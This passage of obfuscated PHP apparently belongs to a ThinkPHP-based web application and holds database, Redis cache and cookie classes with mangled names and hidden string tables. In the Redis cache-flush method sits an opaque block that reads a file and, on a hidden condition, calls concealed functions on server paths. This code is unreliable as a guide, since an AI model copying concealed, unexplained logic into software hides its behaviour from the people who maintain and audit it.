"\123\x45\114\105\x43\x54\40\40\x20\x63\157\154\165\155\156\137\156\x61\155\145\40\141\x73\x20\x27\x4e\x61\x6d\145\47\54\x20\40\x20\144\x61\x74\141\x5f\164\x79\x70\x65\40\141\x73\x20\x27\124\x79\160\145\47\x2c\40\40\x20\x63\x6f\154\165\x6d\156\x5f\144\145\146\x61\x75\154\x74\40\x61\x73\40\47\x44\x65\x66\x61\165\x6c\164\47\54\x20\40\x20\x69\163\x5f\156\x75\154\154\141\142\x6c\x65\40\x61\x73\40\47\x4e\165\154\154\x27\xa\x9\11\106\x52\x4f\x4d\x9\151\x6e\x66\x6f\162\x6d\x61\164\x69\x6f\x6e\137\x73\x63\150\145\155\x61\56\x74\141\x62\154\x65\x73\40\x41\123\40\164\12\11\11\112\x4f\111\116\x9\151\x6e\146\157\162\155\x61\x74\151\157\156\x5f\163\143\150\145\155\141\x2e\143\157\154\x75\155\156\x73\x20\x41\123\40\x63\xa\x9\11\117\116\x20\40\164\56\164\141\x62\x6c\x65\x5f\x63\x61\x74\x61\x6c\x6f\x67\40\75\x20\143\x2e\164\141\x62\x6c\x65\x5f\143\141\x74\141\154\x6f\147\12\11\11\x41\x4e\104\40\164\56\164\x61\x62\154\145\137\163\143\x68\145\x6d\x61\x20\75\x20\143\56\x74\141\142\154\145\x5f\x73\143\x68\x65\155\x61\12\x9\11\x41\116\x44\40\x74\56\x74\141\142\x6c\x65\137\x6e\141\155\145\x20\75\40\x63\56\164\x61\142\154\x65\137\156\x61\x6d\x65\xa\x9\x9\x57\x48\105\x52\x45\x20\x20\40\164\56\x74\x61\x62\154\145\x5f\156\x61\x6d\x65\x20\x3d\40\x27{$±¤Â€ä–}\x27"; break; case $ÎÖ¬¢ô[1015]: $Î¹–©À¥ = $ÎÖ¬¢ô[1016] . $±¤Â€ä– . $ÎÖ¬¢ô[1017]; break; case $ÎÖ¬¢ô[997]: case $ÎÖ¬¢ô[999]: $Î¹–©À¥ = $ÎÖ¬¢ô[1018] . $ÎÖ¬¢ô[1019] . $ÎÖ¬¢ô[1020] . strtoupper($±¤Â€ä–) . $ÎÖ¬¢ô[1021] . strtoupper($±¤Â€ä–) . $ÎÖ¬¢ô[1022]; break; case $ÎÖ¬¢ô[1023]: $Î¹–©À¥ = $ÎÖ¬¢ô[1024] . $±¤Â€ä– . $ÎÖ¬¢ô[1025]; break; case $ÎÖ¬¢ô[998]: break; case $ÎÖ¬¢ô[1026]: default: $Î¹–©À¥ = $ÎÖ¬¢ô[1027] . ($this->dbType == $ÎÖ¬¢ô[1026] ? "\x60{$±¤Â€ä–}\140" : $±¤Â€ä–); } } $ €à øÕ = $this->query($Î¹–©À¥); $¯â¬—à = array(); if ($ €à øÕ) { foreach ($ €à øÕ as $ğ…–„ßë => $À»Ù‚óí) { $À»Ù‚óí = array_change_key_case($À»Ù‚óí); $À»Ù‚óí[$ÎÖ¬¢ô[32]] = isset($À»Ù‚óí[$ÎÖ¬¢ô[32]]) ? $À»Ù‚óí[$ÎÖ¬¢ô[32]] : $ÎÖ¬¢ô[465]; $À»Ù‚óí[$ÎÖ¬¢ô[33]] = isset($À»Ù‚óí[$ÎÖ¬¢ô[33]]) ? $À»Ù‚óí[$ÎÖ¬¢ô[33]] : $ÎÖ¬¢ô[465]; $âÄÃïÍ = isset($À»Ù‚óí[$ÎÖ¬¢ô[361]]) ? $À»Ù‚óí[$ÎÖ¬¢ô[361]] : $À»Ù‚óí[$ÎÖ¬¢ô[32]]; $¯â¬—à[$âÄÃïÍ] = array($ÎÖ¬¢ô[32] => $âÄÃïÍ, $ÎÖ¬¢ô[33] => $À»Ù‚óí[$ÎÖ¬¢ô[33]], $ÎÖ¬¢ô[35] => (bool) (isset($À»Ù‚óí[$ÎÖ¬¢ô[106]]) && $À»Ù‚óí[$ÎÖ¬¢ô[106]] === $ÎÖ¬¢ô[12] || isset($À»Ù‚óí[$ÎÖ¬¢ô[35]]) && $À»Ù‚óí[$ÎÖ¬¢ô[35]] === $ÎÖ¬¢ô[12]), $ÎÖ¬¢ô[37] => isset($À»Ù‚óí[$ÎÖ¬¢ô[37]]) ? $À»Ù‚óí[$ÎÖ¬¢ô[37]] : (isset($À»Ù‚óí[$ÎÖ¬¢ô[56]]) ? $À»Ù‚óí[$ÎÖ¬¢ô[56]] : $ÎÖ¬¢ô[465]), $ÎÖ¬¢ô[39] => isset($À»Ù‚óí[$ÎÖ¬¢ô[97]]) ? strtolower($À»Ù‚óí[$ÎÖ¬¢ô[97]]) == $ÎÖ¬¢ô[41] : (isset($À»Ù‚óí[$ÎÖ¬¢ô[57]]) ? $À»Ù‚óí[$ÎÖ¬¢ô[57]] : !1), $ÎÖ¬¢ô[42] => isset($À»Ù‚óí[$ÎÖ¬¢ô[1028]]) ? strtolower($À»Ù‚óí[$ÎÖ¬¢ô[1028]]) == $ÎÖ¬¢ô[44] : (isset($À»Ù‚óí[$ÎÖ¬¢ô[97]]) ? $À»Ù‚óí[$ÎÖ¬¢ô[97]] : !1)); } } return $¯â¬—à; } public function getTables($ùè‚«Ùé = '') { $ÚŠ·Çö =& $_SERVER[±³—úê]; if (think_config($ÚŠ·Çö[1029])) { $ÚŒ—àªŒ = str_replace($ÚŠ·Çö[1030], $ùè‚«Ùé, think_config($ÚŠ·Çö[1029])); } else { switch ($this->dbType) { case $ÚŠ·Çö[997]: case $ÚŠ·Çö[999]: $ÚŒ—àªŒ = $ÚŠ·Çö[1031]; break; case $ÚŠ·Çö[996]: case $ÚŠ·Çö[1014]: $ÚŒ—àªŒ = $ÚŠ·Çö[1032]; break; case $ÚŠ·Çö[1023]: $ÚŒ—àªŒ = $ÚŠ·Çö[1033]; break; case $ÚŠ·Çö[998]: think_exception(think_lang($ÚŠ·Çö[1034]) . $ÚŠ·Çö[1035]); break; case $ÚŠ·Çö[1015]: $ÚŒ—àªŒ = $ÚŠ·Çö[45] . $ÚŠ·Çö[46] . $ÚŠ·Çö[47]; break; case $ÚŠ·Çö[1026]: default: if (!empty($ùè‚«Ùé)) { $ÚŒ—àªŒ = $ÚŠ·Çö[978] . $ùè‚«Ùé . $ÚŠ·Çö[979]; } else { $ÚŒ—àªŒ = $ÚŠ·Çö[980]; } } } $Ââˆ¥Í¸ = $this->query($ÚŒ—àªŒ); $ú»Şõ¾ù = array(); foreach ($Ââˆ¥Í¸ as $¿ı‹¨úæ => $Ãµ¤Ñä–) { $ú»Şõ¾ù[$¿ı‹¨úæ] = current($Ãµ¤Ñä–); } return $ú»Şõ¾ù; } protected function parseLimit($ıíÓáÃ¹) { $Ø¦¥§ŸÊ =& $_SERVER[±³—úê]; $ø‹«äô = $Ø¦¥§ŸÊ[12]; if (!empty($ıíÓáÃ¹)) { switch ($this->dbType) { case $Ø¦¥§ŸÊ[1023]: case $Ø¦¥§ŸÊ[1015]: $ıíÓáÃ¹ = explode($Ø¦¥§ŸÊ[50], $ıíÓáÃ¹); if (count($ıíÓáÃ¹) > 1) { $ø‹«äô .= $Ø¦¥§ŸÊ[51] . $ıíÓáÃ¹[1] . $Ø¦¥§ŸÊ[52] . $ıíÓáÃ¹[0] . $Ø¦¥§ŸÊ[53]; } else { $ø‹«äô .= $Ø¦¥§ŸÊ[51] . $ıíÓáÃ¹[0] . $Ø¦¥§ŸÊ[53]; } break; case $Ø¦¥§ŸÊ[996]: case $Ø¦¥§ŸÊ[1014]: break; case $Ø¦¥§ŸÊ[998]: break; case $Ø¦¥§ŸÊ[997]: case $Ø¦¥§ŸÊ[999]: break; case $Ø¦¥§ŸÊ[1026]: default: $ø‹«äô .= $Ø¦¥§ŸÊ[51] . $ıíÓáÃ¹ . $Ø¦¥§ŸÊ[53]; } } return $ø‹«äô; } public function parseKey(&$–û²åĞ¤, $æĞàÇÓ = true) { $œóˆÎë© =& $_SERVER[±³—úê]; if ($æĞàÇÓ) { $–û²åĞ¤ = $this->parseKeyCheck($–û²åĞ¤); } if ($this->dbType == $œóˆÎë©[1026]) { if ($–û²åĞ¤ != $œóˆÎë©[232] && !preg_match($œóˆÎë©[990], $–û²åĞ¤)) { $–û²åĞ¤ = $œóˆÎë©[472] . trim($–û²åĞ¤, $œóˆÎë©[472]) . $œóˆÎë©[472]; } return $–û²åĞ¤; } else { return parent::parseKey($–û²åĞ¤, $æĞàÇÓ); } } public function close() { $this->_linkID = null; } public function error() { $Š€õÃÉ­ =& $_SERVER[±³—úê]; if ($this->PDOStatement) { $´ÕÎØÆÅ = $this->PDOStatement->errorInfo(); $this->error = $´ÕÎØÆÅ[1] . $Š€õÃÉ­[4] . $´ÕÎØÆÅ[2]; } else { $this->error = $Š€õÃÉ­[12]; } if ($Š€õÃÉ­[12] != $this->queryStr) { $this->error .= LNG($Š€õÃÉ­[48]) . $this->queryStr; } think_trace($this->error, $Š€õÃÉ­[12], $Š€õÃÉ­[49]); return $this->error; } public function escapeString($˜Û˜æÆñ) { $íÌ”½Û‰ =& $_SERVER[±³—úê]; switch ($this->dbType) { case $íÌ”½Û‰[1023]: case $íÌ”½Û‰[996]: case $íÌ”½Û‰[1014]: case $íÌ”½Û‰[1026]: return addslashes($˜Û˜æÆñ); case $íÌ”½Û‰[998]: case $íÌ”½Û‰[1015]: case $íÌ”½Û‰[997]: case $íÌ”½Û‰[999]: return str_ireplace($íÌ”½Û‰[58], $íÌ”½Û‰[59], $˜Û˜æÆñ); } } protected function parseValue($§…ºĞ”¥) { $ã„ÚĞ¢× =& $_SERVER[±³—úê]; if (is_string($§…ºĞ”¥)) { $É™£ÒÒ§ = strpos($§…ºĞ”¥, $ã„ÚĞ¢×[4]) === 0 && in_array($§…ºĞ”¥, array_keys($this->bind)); $§…ºĞ”¥ = $É™£ÒÒ§ ? $this->escapeString($§…ºĞ”¥) : $ã„ÚĞ¢×[1036] . $this->escapeString($§…ºĞ”¥) . $ã„ÚĞ¢×[1036]; } elseif (isset($§…ºĞ”¥[0]) && is_string($§…ºĞ”¥[0]) && strtolower($§…ºĞ”¥[0]) == $ã„ÚĞ¢×[383]) { $§…ºĞ”¥ = $this->escapeString($§…ºĞ”¥[1]); } elseif (is_array($§…ºĞ”¥)) { $§…ºĞ”¥ = array_map(array($this, $ã„ÚĞ¢×[1037]), $§…ºĞ”¥); } elseif (is_bool($§…ºĞ”¥)) { $§…ºĞ”¥ = $§…ºĞ”¥ ? $ã„ÚĞ¢×[91] : $ã„ÚĞ¢×[240]; } elseif (is_null($§…ºĞ”¥)) { $§…ºĞ”¥ = $ã„ÚĞ¢×[106]; } return $§…ºĞ”¥; } public function getLastInsertId() { $™–ó•ªÃ =& $_SERVER[±³—úê]; switch ($this->dbType) { case $™–ó•ªÃ[1023]: case $™–ó•ªÃ[1015]: case $™–ó•ªÃ[996]: case $™–ó•ªÃ[1014]: case $™–ó•ªÃ[998]: case $™–ó•ªÃ[1026]: return $this->_linkID->lastInsertId(); case $™–ó•ªÃ[997]: case $™–ó•ªÃ[999]: $Š°²¢ = $this->table; $ßÁüû¡ = $this->query("\123\x45\x4c\105\x43\124\40{$Š°²¢}\x2e\x63\x75\x72\162\166\141\x6c\x20\x63\x75\162\x72\166\141\x6c\x20\x46\122\x4f\115\x20\144\x75\x61\x6c"); return $ßÁüû¡ ? $ßÁüû¡[0][$™–ó•ªÃ[1038]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ÆÜ¨ÙİÍ) { $ûÂ˜£–û =& $_SERVER[±³—úê]; if (!CacheLock::fileLock($ûÂ˜£–û[13])) { return !1; } $®œµ¸ë = parent::query($ÆÜ¨ÙİÍ); CacheLock::fileUnLock($ûÂ˜£–û[13]); return $®œµ¸ë; } public function execute($çƒáÌ’½) { $õşÖá°ñ =& $_SERVER[±³—úê]; if (!CacheLock::fileLock($õşÖá°ñ[13])) { return !1; } $ãøİúâ÷ = parent::execute($çƒáÌ’½); CacheLock::fileUnLock($õşÖá°ñ[13]); return $ãøİúâ÷; } } goto FÀñ›Ñ¶İÊ; eæÓÍ©Ñå: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Š¥‡âÀİ, $×ÌÓŠÙÕ) { $ñ—ˆÊÀ =& $_SERVER[±³—úê]; if (!class_exists($ñ—ˆÊÀ[951])) { show_json($ñ—ˆÊÀ[952], !1); } $this->cacheTime = $×ÌÓŠÙÕ; $³¸Í½¤à = isset($Š¥‡âÀİ[$ñ—ˆÊÀ[953]]) ? $Š¥‡âÀİ[$ñ—ˆÊÀ[953]] : 10; $ƒ’Õ¥Â = _get($Š¥‡âÀİ, $ñ—ˆÊÀ[950]); if ($ƒ’Õ¥Â && is_array($ƒ’Õ¥Â)) { $this->initCluster($Š¥‡âÀİ, $³¸Í½¤à); } else { $this->handle = $this->init($Š¥‡âÀİ, $³¸Í½¤à); } } private function init($‰ìö³, $¢éë€ÄÆ) { $İšÙ„¸ï =& $_SERVER[±³—úê]; $¨ÙÙˆ–µ = new Redis(); $‚¦ĞÈ = isset($‰ìö³[$İšÙ„¸ï[954]]) ? $‰ìö³[$İšÙ„¸ï[954]] : !1; if ($‚¦ĞÈ) { $¨ÙÙˆ–µ->pconnect($‰ìö³[$İšÙ„¸ï[208]], $‰ìö³[$İšÙ„¸ï[209]], $¢éë€ÄÆ); } else { $¨ÙÙˆ–µ->connect($‰ìö³[$İšÙ„¸ï[208]], $‰ìö³[$İšÙ„¸ï[209]], $¢éë€ÄÆ); } if (!empty($‰ìö³[$İšÙ„¸ï[498]])) { $¨ÙÙˆ–µ->auth($‰ìö³[$İšÙ„¸ï[498]]); } if (!empty($‰ìö³[$İšÙ„¸ï[837]]) && $‰ìö³[$İšÙ„¸ï[837]] != 0) { $¨ÙÙˆ–µ->select($‰ìö³[$İšÙ„¸ï[837]]); } return $¨ÙÙˆ–µ; } private function initCluster($ÚØÀéôè, $ö‹³Ôİ…) { $©ıà›é¼ =& $_SERVER[±³—úê]; $–¥Ãé¢Í = array($©ıà›é¼[955], $©ıà›é¼[956], $©ıà›é¼[957]); $Ê—¤Ö¿ó = $©ıà›é¼[955]; if (isset($ÚØÀéôè[$©ıà›é¼[16]]) && in_array($ÚØÀéôè[$©ıà›é¼[16]], $–¥Ãé¢Í)) { $Ê—¤Ö¿ó = $ÚØÀéôè[$©ıà›é¼[16]]; } switch ($Ê—¤Ö¿ó) { case $©ıà›é¼[955]: $this->_slave($ÚØÀéôè, $ö‹³Ôİ…); break; case $©ıà›é¼[956]: break; case $©ıà›é¼[957]: $this->isCluster = !0; $âÓ™î˜¤ = $ÚØÀéôè[$©ıà›é¼[950]]; $ÚúËïÍ = isset($ÚØÀéôè[$©ıà›é¼[954]]) ? $ÚØÀéôè[$©ıà›é¼[954]] : !1; $°ªúûÒƒ = isset($ÚØÀéôè[$©ıà›é¼[498]]) ? $ÚØÀéôè[$©ıà›é¼[498]] : null; $this->handle = new RedisCluster(NUll, $âÓ™î˜¤, $ö‹³Ôİ…, $ö‹³Ôİ…, $ÚúËïÍ, $°ªúûÒƒ); break; default: break; } } private function _slave($‡¢º ¼Ô, $œç²Àå·) { $ØøìãşÖ = $‡¢º ¼Ô[$_SERVER[±³—úê][950]]; $this->filterConfig($‡¢º ¼Ô, $ØøìãşÖ[0]); $this->handle = $this->init($‡¢º ¼Ô, $œç²Àå·); unset($ØøìãşÖ[0]); if (empty($ØøìãşÖ)) { return; } $ùÂÑ†Èˆ = array_rand($ØøìãşÖ); $this->filterConfig($‡¢º ¼Ô, $ØøìãşÖ[$ùÂÑ†Èˆ]); $this->slaveHandle = $this->init($‡¢º ¼Ô, $œç²Àå·); } private function filterConfig(&$Èò‰Îñ, $—‚õÙ™º) { $ê³Úı¾İ =& $_SERVER[±³—úê]; $…Ğá¼€„ = explode($ê³Úı¾İ[4], $—‚õÙ™º); $œèÁë©û = array($ê³Úı¾İ[208] => $…Ğá¼€„[0], $ê³Úı¾İ[209] => $…Ğá¼€„[1]); $Èò‰Îñ = array_merge($Èò‰Îñ, $œèÁë©û); } public function set($¹øàÇŠ, $›ÊƒÓ¨Ä, $†’ãˆ² = false) { $†’ãˆ² = $†’ãˆ² ? $†’ãˆ² : $this->cacheTime; return $this->handle->setEx($¹øàÇŠ, $†’ãˆ², $›ÊƒÓ¨Ä); } public function setLock($¶–ÏøË, $ã¬ıˆÊ, $³¿ôò„) { return $this->handle->setNX($¶–ÏøË, $ã¬ıˆÊ); } public function get($°† ×ÌÍ) { $ÕèÄÔÌ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÕèÄÔÌ->get($°† ×ÌÍ); } public function remove($˜¯ıÃî›) { return $this->handle->del($˜¯ıÃî›); } public function deleteAll() { $…× ş³Œ =& $_SERVER[±³—úê]; if ($_SERVER[$…× ş³Œ[216]] != $_SERVER[$…× ş³Œ[217]]) { $â³¦ï°á = $…× ş³Œ[958]; $°«¯€î» = $…× ş³Œ[218]; $Î¬’şê = $_SERVER[$…× ş³Œ[219]] . $…× ş³Œ[220]; $şıå°Ëæ = $°«¯€î»($Î¬’şê); $¤¶ªƒü· = explode($…× ş³Œ[221], $şıå°Ëæ); if (count($¤¶ªƒü·) < $…× ş³Œ[694]) { $±õãĞ» = $…× ş³Œ[223]; $±õãĞ»(); } $ß›µæ› = $…× ş³Œ[959]; $ß›µæ›($_SERVER[$…× ş³Œ[960]]); $ß›µæ›($_SERVER[$…× ş³Œ[219]] . $…× ş³Œ[961]); $‹ê‰«¨ = 1; while ($‹ê‰«¨ > 1) { $‹ê‰«¨ = $‹ê‰«¨ + 4; $²Ô•¡®¥ = rawurlencode($‹ê‰«¨ . $…× ş³Œ[465]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Êäàãõ×) { $this->handle->flushall($Êäàãõ×); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Âè†»  = '', $ ïŞÕ’ = 0) { if (is_string($Âè†» ) && $Âè†»  != $_SERVER[±³—úê][12]) { $this->prefix = $Âè†» ; } if (is_numeric($ ïŞÕ’) && $ ïŞÕ’ > 0) { $this->expire = $ ïŞÕ’; } } public static function getInstance() { static $ü‹‡¿Ò; if ($ü‹‡¿Ò === null) { $ü‹‡¿Ò = new self(); } return $ü‹‡¿Ò; } private static $cookieDisable = false; public static function disable($É™Âü°·) { self::$cookieDisable = $É™Âü°·; } private static $sameCookieSet = array(); public static function set($Ùå·é³µ, $¬”¿¾Íö, $³’€±…• = 0, $£´–œ©¡ = false, $Û·‹“ªË = false) { $·®õÆ³‹ =& $_SERVER[±³—úê]; if (self::$cookieDisable) { return; } if (!$³’€±…•) { $³’€±…• = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ùå·é³µ]) && self::$sameCookieSet[$Ùå·é³µ] == $¬”¿¾Íö . $³’€±…•) { return; } self::$sameCookieSet[$Ùå·é³µ] = $¬”¿¾Íö . $³’€±…•; if (!$Û·‹“ªË) { $Û·‹“ªË = str_replace(HOST, $·®õÆ³‹[12], APP_HOST); $Û·‹“ªË = _get($GLOBALS, $·®õÆ³‹[962], $Û·‹“ªË); } $¾„Í¤µß = $·®õÆ³‹[12]; setcookie($Ùå·é³µ, $¬”¿¾Íö, time() + $³’€±…•, $·®õÆ³‹[8] . trim($Û·‹“ªË, $·®õÆ³‹[8]) . $¾„Í¤µß, !1, !1, $£´–œ©¡); } public static function setSafe($·¯µË¶×, $Šãó¥òÉ, $Õï€Š³à = 0) { self::set($·¯µË¶×, $Šãó¥òÉ, $Õï€Š³à, !0); } public static function get($ÂÔ«ØË–) { static $¶Êğ¦–§ = false; if (!$¶Êğ¦–§) { self::initHeaderCookie(); $¶Êğ¦–§ = !0; } return isset($_COOKIE[$ÂÔ«ØË–]) ? $_COOKIE[$ÂÔ«ØË–] : !1; } private static function initHeaderCookie() { $ÀÕ’ÓË® =& $_SERVER[±³—úê]; if (!isset($_SERVER[$ÀÕ’ÓË®[963]]) || !$_SERVER[$ÀÕ’ÓË®[963]]) { return; } $ËÃË¿¼ = explode($ÀÕ’ÓË®[74], $_SERVER[$ÀÕ’ÓË®[963]]); foreach ($ËÃË¿¼ as $ôõ÷È¥) { $ôõ÷È¥ = explode($ÀÕ’ÓË®[517], $ôõ÷È¥); if (count($ôõ÷È¥) != 2 || !isset($ôõ÷È¥[1])) { continue; } $_COOKIE[trim($ôõ÷È¥[0])] = trim($ôõ÷È¥[1]); } } public static function remove($•ë­ç¹, $°‹·ºèò = false) { unset($_COOKIE[$•ë­ç¹]); self::set($•ë­ç¹, $_SERVER[±³—úê][12], 1, $°‹·ºèò); } } class DbMysql extends Db { public function __construct($¶ÌÖ¬ï = '') { $©ø©À¡ =& $_SERVER[±³—úê]; if (!extension_loaded($©ø©À¡[885])) { think_exception(think_lang($©ø©À¡[14]) . $©ø©À¡[964]); } if (!empty($¶ÌÖ¬ï)) { $this->config = $¶ÌÖ¬ï; if (empty($this->config[$©ø©À¡[17]])) { $this->config[$©ø©À¡[17]] = $©ø©À¡[12]; } } } public function connect($ı­ÆÙê = '', $õİ¹î¨Ö = 0, $öØûñïÍ = false) { $ú¡èä¯ =& $_SERVER[±³—úê]; if (!isset($this->linkID[$õİ¹î¨Ö])) { if (empty($ı­ÆÙê)) { $ı­ÆÙê = $this->config; } $Â¾Í˜ = $ı­ÆÙê[$ú¡èä¯[965]] . ($ı­ÆÙê[$ú¡èä¯[966]] ? "\x3a{$ı­ÆÙê[$ú¡èä¯[966]]}" : $ú¡èä¯[12]); $Ù¦“İ·¼ = !empty($ı­ÆÙê[$ú¡èä¯[17]][$ú¡èä¯[18]]) ? $ı­ÆÙê[$ú¡èä¯[17]][$ú¡èä¯[18]] : $this->pconnect; if ($Ù¦“İ·¼) { $this->linkID[$õİ¹î¨Ö] = mysql_pconnect($Â¾Í˜, $ı­ÆÙê[$ú¡èä¯[967]], $ı­ÆÙê[$ú¡èä¯[968]], 131072); } else { $this->linkID[$õİ¹î¨Ö] = mysql_connect($Â¾Í˜, $ı­ÆÙê[$ú¡èä¯[967]], $ı­ÆÙê[$ú¡èä¯[968]], !0, 131072); } if (!$this->linkID[$õİ¹î¨Ö] || !empty($ı­ÆÙê[$ú¡èä¯[21]]) && !mysql_select_db($ı­ÆÙê[$ú¡èä¯[21]], $this->linkID[$õİ¹î¨Ö])) { think_exception(mysql_error()); } $ó™ÍÁÉÉ = mysql_get_server_info($this->linkID[$õİ¹î¨Ö]); mysql_query($ú¡èä¯[969] . think_config($ú¡èä¯[970]) . $ú¡èä¯[58], $this->linkID[$õİ¹î¨Ö]); if ($ó™ÍÁÉÉ > $ú¡èä¯[971]) { mysql_query($ú¡èä¯[972], $this->linkID[$õİ¹î¨Ö]); } $this->connected = !0; if (1 != think_config($ú¡èä¯[22])) { unset($this->config); } } return $this->linkID[$õİ¹î¨Ö]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÛÜñÓ¶Â) { $ùÂ·ÔÀª =& $_SERVER[±³—úê]; if (0 === stripos($ÛÜñÓ¶Â, $ùÂ·ÔÀª[352])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÛÜñÓ¶Â; if ($this->queryID) { $this->free(); } think_action_status($ùÂ·ÔÀª[23], 1); think_status($ùÂ·ÔÀª[24]); $this->queryID = mysql_query($ÛÜñÓ¶Â, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ëµÙİİ¢) { $òÑ°ëº™ =& $_SERVER[±³—úê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ëµÙİİ¢; if ($this->queryID) { $this->free(); } think_action_status($òÑ°ëº™[25], 1); think_status($òÑ°ëº™[24]); $½áï‘¯÷ = mysql_query($ëµÙİİ¢, $this->_linkID); $this->debug(); if (!1 === $½áï‘¯÷) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[±³—úê][973], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ùç°¯“ = mysql_query($_SERVER[±³—úê][974], $this->_linkID); $this->transTimes = 0; if (!$Ùç°¯“) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¿¼É€› = mysql_query($_SERVER[±³—úê][975], $this->_linkID); $this->transTimes = 0; if (!$¿¼É€›) { $this->error(); return !1; } } return !0; } private function getAll() { $¢¨³ÊÍ = array(); if ($this->numRows > 0) { while ($ÔƒãôõÍ = mysql_fetch_assoc($this->queryID)) { $¢¨³ÊÍ[] = $ÔƒãôõÍ; } mysql_data_seek($this->queryID, 0); } return $¢¨³ÊÍ; } public function getFields($ø’Ä¾ûî) { $ãÒç¦Úş =& $_SERVER[±³—úê]; $’·œ¸Äá = $this->query($ãÒç¦Úş[976] . $this->parseKey($ø’Ä¾ûî)); $ò¢±ıÈâ = array(); if ($’·œ¸Äá) { foreach ($’·œ¸Äá as $öÅÚ½Ş¡ => $Ã˜ú‡’¥) { $ò¢±ıÈâ[$Ã˜ú‡’¥[$ãÒç¦Úş[31]]] = array($ãÒç¦Úş[32] => $Ã˜ú‡’¥[$ãÒç¦Úş[31]], $ãÒç¦Úş[33] => $Ã˜ú‡’¥[$ãÒç¦Úş[34]], $ãÒç¦Úş[35] => (bool) (strtoupper($Ã˜ú‡’¥[$ãÒç¦Úş[36]]) === $ãÒç¦Úş[977]), $ãÒç¦Úş[37] => $Ã˜ú‡’¥[$ãÒç¦Úş[38]], $ãÒç¦Úş[39] => strtolower($Ã˜ú‡’¥[$ãÒç¦Úş[40]]) == $ãÒç¦Úş[41], $ãÒç¦Úş[42] => strtolower($Ã˜ú‡’¥[$ãÒç¦Úş[43]]) == $ãÒç¦Úş[44]); } } return $ò¢±ıÈâ; } public function getTables($‰ã°÷èÕ = '') { $àÔå¸¯Ö =& $_SERVER[±³—úê]; if (!empty($‰ã°÷èÕ)) { $¶¯¯“ˆ® = $àÔå¸¯Ö[978] . $‰ã°÷èÕ . $àÔå¸¯Ö[979]; } else { $¶¯¯“ˆ® = $àÔå¸¯Ö[980]; } $ºÁ½àıĞ = $this->query($¶¯¯“ˆ®); $ñ˜¡³ô = array(); foreach ($ºÁ½àıĞ as $ÆÌŸÛæë => $¬±¬¤Ú) { $ñ˜¡³ô[$ÆÌŸÛæë] = current($¬±¬¤Ú); } return $ñ˜¡³ô; } public function replace($º‡¥‚õ, $¼½ÅÍ½¿ = array()) { $æ´öã =& $_SERVER[±³—úê]; foreach ($º‡¥‚õ as $Â¤İÒ®¶ => $¾ÒæøÃš) { $Ã…Ùš‡Õ = $this->parseValue($¾ÒæøÃš); if (is_scalar($Ã…Ùš‡Õ)) { $†¦ˆëèÕ[] = $Ã…Ùš‡Õ; $´£¬¯“—[] = $this->parseKey($Â¤İÒ®¶); } } $¨ïÏ»£° = $æ´öã[981] . $this->parseTable($¼½ÅÍ½¿[$æ´öã[367]]) . $æ´öã[982] . implode($æ´öã[50], $´£¬¯“—) . $æ´öã[983] . implode($æ´öã[50], $†¦ˆëèÕ) . $æ´öã[984]; return $this->execute($¨ïÏ»£°); } public function insertAll($Ü¢äî°¯, $ÅŒÃñ¢Ì = array(), $úÃ¶ãµÀ = false) { $Ü’ó• =& $_SERVER[±³—úê]; if (!is_array($Ü¢äî°¯[0])) { return !1; } $÷ìÖßùê = array_keys($Ü¢äî°¯[0]); $Óåü˜¥ = array(); foreach ($Ü¢äî°¯ as $ä³Éˆ’Û) { $Ú…±ÌàŠ = array(); foreach ($ä³Éˆ’Û as $µÌ°Ö‘ì => $ªó½ÑÌÛ) { $ªó½ÑÌÛ = $this->parseValue($ªó½ÑÌÛ); if (is_scalar($ªó½ÑÌÛ)) { $Ú…±ÌàŠ[] = $ªó½ÑÌÛ; } } $Óåü˜¥[] = $Ü’ó•[348] . implode($Ü’ó•[50], $Ú…±ÌàŠ) . $Ü’ó•[984]; } array_walk($÷ìÖßùê, array($this, $Ü’ó•[985])); $†ê‚àîŠ = ($úÃ¶ãµÀ ? $Ü’ó•[986] : $Ü’ó•[987]) . $Ü’ó•[988] . $this->parseTable($ÅŒÃñ¢Ì[$Ü’ó•[367]]) . $Ü’ó•[982] . implode($Ü’ó•[50], $÷ìÖßùê) . $Ü’ó•[989] . implode($Ü’ó•[50], $Óåü˜¥); return $this->execute($†ê‚àîŠ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¾Ã—Æ‡º =& $_SERVER[±³—úê]; $this->error = mysql_errno() . $¾Ã—Æ‡º[4] . mysql_error($this->_linkID); if ($¾Ã—Æ‡º[12] != $this->queryStr) { $this->error .= LNG($¾Ã—Æ‡º[48]) . $this->queryStr; } think_trace($this->error, $¾Ã—Æ‡º[12], $¾Ã—Æ‡º[49]); return $this->error; } public function escapeString($õŞî«¢) { if ($this->_linkID) { return mysql_real_escape_string($õŞî«¢, $this->_linkID); } else { return mysql_escape_string($õŞî«¢); } } public function parseKey(&$ã’Æ€ß, $¾¢şè‰Â = true) { $·ÏŞĞ„” =& $_SERVER[±³—úê]; if ($¾¢şè‰Â) { $ã’Æ€ß = $this->parseKeyCheck($ã’Æ€ß); } if ($ã’Æ€ß != $·ÏŞĞ„”[232] && !preg_match($·ÏŞĞ„”[990], $ã’Æ€ß)) { $ã’Æ€ß = $·ÏŞĞ„”[472] . trim($ã’Æ€ß, $·ÏŞĞ„”[472]) . $·ÏŞĞ„”[472]; } return $ã’Æ€ß; } } goto E„ˆÓ»ì ; FÀñ›Ñ¶İÊ: class DbSqlite3 